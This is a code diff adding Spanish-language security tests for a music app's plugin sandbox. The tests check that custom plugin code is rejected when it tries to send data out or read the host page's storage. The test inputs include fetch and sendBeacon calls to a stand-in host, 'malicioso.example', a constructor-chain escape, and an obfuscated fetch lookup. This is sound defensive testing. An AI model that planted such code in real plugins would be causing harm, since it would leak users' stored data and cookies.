@@ -10,6 +10,11 @@ import {
   SATURATOR_DRIVE_DEBOUNCE_MS,
 } from './builtinPlugins';
 import { pluginHost, clampToDef } from './PluginHost';
+import {
+  evaluateCustomPlugin,
+  evaluateCustomPluginSandboxed,
+  isSandboxAvailable,
+} from './pluginSandbox';
 import type { ActiveDSPNode } from './PluginHost';
 import { AudioEngine } from './AudioEngine';
 import { MasterBus } from './MasterBus';
@@ -368,6 +373,190 @@ describe('waveA: seguridad de plugins y operaciones', () => {
     const far = calculateMagneticSnap(0.30, 120, [4, 4], [], 0.02);
     expect(far.isSnapped).toBe(false);
   });
+
+// ---------------------------------------------------------------------------
+// SEC-01 / AUD-08: el sandbox de plugins rechaza la exfiltración (SB1-SB7)
+// ---------------------------------------------------------------------------
+
+const SB_LEGIT_CODE = `
+  const customPlugin = {
+    id: 'sb_legit',
+    name: 'Legítimo',
+    category: 'utility',
+    description: 'plugin de prueba sin APIs peligrosas',
+    parameters: [],
+    createDSPNode: (ctx) => {
+      const g = ctx.createGain();
+      return { inputNode: g, outputNode: g, updateParameter: () => {} };
+    }
+  };
+`;
+
+describe('SEC-01: el sandbox de plugins rechaza la exfiltración (SB1-SB7)', () => {
+  it('SB1: globalThis.fetch se rechaza y no deja rastro en globalThis', () => {
+    expect(() =>
+      pluginHost.registerCustomPlugin(`
+        globalThis.fetch('https://malicioso.example/fuga');
+        const customPlugin = { id: 'sb1', name: 'SB1', parameters: [], createDSPNode: () => ({}) };
+      `)
+    ).toThrow(/bloqueado por seguridad/);
+    expect(() =>
+      pluginHost.registerCustomPlugin(`
+        globalThis.__pwned = 1;
+        const customPlugin = { id: 'sb1b', name: 'SB1b', parameters: [], createDSPNode: () => ({}) };
+      `)
+    ).toThrow(/bloqueado por seguridad/);
+    expect((globalThis as unknown as Record<string, unknown>).__pwned).toBeUndefined();
+  });
+
+  it('SB2: navigator.sendBeacon se rechaza', () => {
+    expect(() =>
+      pluginHost.registerCustomPlugin(`
+        navigator.sendBeacon('https://malicioso.example/fuga', 'datos');
+        const customPlugin = { id: 'sb2', name: 'SB2', parameters: [], createDSPNode: () => ({}) };
+      `)
+    ).toThrow(/bloqueado por seguridad/);
+  });
+
+  it('SB3: location.href se rechaza', () => {
+    expect(() =>
+      pluginHost.registerCustomPlugin(`
+        const destino = location.href;
+        const customPlugin = { id: 'sb3', name: 'SB3', parameters: [], createDSPNode: () => ({}) };
+      `)
+    ).toThrow(/bloqueado por seguridad/);
+  });
+
+  it('SB4: x.constructor.constructor("...") se rechaza', () => {
+    expect(() =>
+      pluginHost.registerCustomPlugin(`
+        const x = {};
+        const f = x.constructor.constructor("return 42");
+        const customPlugin = { id: 'sb4', name: 'SB4', parameters: [], createDSPNode: () => ({}) };
+      `)
+    ).toThrow(/bloqueado por seguridad/);
+  });
+
+  it('SB5: self["fe"+"tch"] (concatenación) se rechaza', () => {
+    expect(() =>
+      pluginHost.registerCustomPlugin(`
+        const robar = self['fe' + 'tch'];
+        const customPlugin = { id: 'sb5', name: 'SB5', parameters: [], createDSPNode: () => ({}) };
+      `)
+    ).toThrow(/bloqueado por seguridad/);
+  });
+
+  it('SB6: un plugin legítimo sí se acepta', () => {
+    const def = pluginHost.registerCustomPlugin(SB_LEGIT_CODE);
+    expect(def.id).toBe('sb_legit');
+    expect(typeof def.createDSPNode).toBe('function');
+  });
+
+  it('SB7: el código no puede leer el almacenamiento del padre (caches/cookieStore/localStorage/indexedDB)', () => {
+    const seen: string[] = [];
+    vi.stubGlobal('caches', {
+      open: (name: string) => {
+        seen.push(`caches.open:${name}`);
+        return Promise.resolve(null);
+      },
+    });
+    vi.stubGlobal('cookieStore', {
+      get: (name: string) => {
+        seen.push(`cookieStore.get:${name}`);
+        return Promise.resolve(null);
+      },
+    });
+    vi.stubGlobal('localStorage', {
+      getItem: (key: string) => {
+        seen.push(`localStorage:${key}`);
+        return 'SECRETO';
+      },
+    });
+    vi.stubGlobal('indexedDB', {
+      open: (name: string) => {
+        seen.push(`indexedDB.open:${name}`);
+        return null;
+      },
+    });
+    try {
+      expect(() =>
+        pluginHost.registerCustomPlugin(`
+          caches.open('hydradaw-proyectos');
+          const customPlugin = { id: 'sb7a', name: 'SB7a', parameters: [], createDSPNode: () => ({}) };
+        `)
+      ).toThrow(/bloqueado por seguridad/);
+      expect(() =>
+        pluginHost.registerCustomPlugin(`
+          cookieStore.get('sesion');
+          const customPlugin = { id: 'sb7b', name: 'SB7b', parameters: [], createDSPNode: () => ({}) };
+        `)
+      ).toThrow(/bloqueado por seguridad/);
+      expect(() =>
+        pluginHost.registerCustomPlugin(`
+          const robado = localStorage.getItem('proyecto');
+          const customPlugin = { id: 'sb7c', name: 'SB7c', parameters: [], createDSPNode: () => ({}) };
+        `)
+      ).toThrow(/bloqueado por seguridad/);
+      expect(() =>
+        pluginHost.registerCustomPlugin(`
+          const db = indexedDB.open('hydradaw');
+          const customPlugin = { id: 'sb7d', name: 'SB7d', parameters: [], createDSPNode: () => ({}) };
+        `)
+      ).toThrow(/bloqueado por seguridad/);
+      expect(seen).toEqual([]);
+    } finally {
+      vi.unstubAllGlobals();
+    }
+  });
+
+  it('SB7b: el acceso diferido dentro de createDSPNode también se rechaza en el registro', () => {
+    expect(() =>
+      pluginHost.registerCustomPlugin(`
+        const customPlugin = {
+          id: 'sb7_deferred',
+          name: 'Diferido',
+          category: 'utility',
+          description: 'intenta leer el almacenamiento al instanciar',
+          parameters: [],
+          createDSPNode: (ctx) => {
+            const g = ctx.createGain();
+            caches.open('hydradaw-proyectos');
+            return { inputNode: g, outputNode: g, updateParameter: () => {} };
+          }
+        };
+      `)
+    ).toThrow(/bloqueado por seguridad/);
+  });
+
+  it('SB-Proto: evaluateCustomPlugin devuelve el protocolo {ok} y rechaza lo prohibido', () => {
+    const good = evaluateCustomPlugin(SB_LEGIT_CODE);
+    expect(good.ok).toBe(true);
+    if (good.ok) expect(good.definition.id).toBe('sb_legit');
+    const bad = evaluateCustomPlugin(
+      `globalThis.fetch('https://malicioso.example/x');\nconst customPlugin = { id: 'z', createDSPNode: () => ({}) };`
+    );
+    expect(bad.ok).toBe(false);
+    if (!bad.ok) expect(bad.error).toMatch(/bloqueado por seguridad/);
+    expect(evaluateCustomPlugin('   ').ok).toBe(false);
+  });
+
+  it('SB-Proto: sin DOM no hay sandbox y la vía aislada rechaza sin ejecutar nada', async () => {
+    expect(isSandboxAvailable()).toBe(false);
+    const seen: string[] = [];
+    vi.stubGlobal('fetch', () => {
+      seen.push('fetch');
+      return Promise.resolve(null);
+    });
+    try {
+      const res = await evaluateCustomPluginSandboxed(SB_LEGIT_CODE);
+      expect(res.ok).toBe(false);
+      if (!res.ok) expect(res.error).toMatch(/sandbox/i);
+      expect(seen).toEqual([]);
+    } finally {
+      vi.unstubAllGlobals();
+    }
+  });
+});
 
   it('registerCustomPlugin bloquea scripts con acceso a APIs peligrosas (fetch/DOM/Storage)', () => {
     expect(() => {
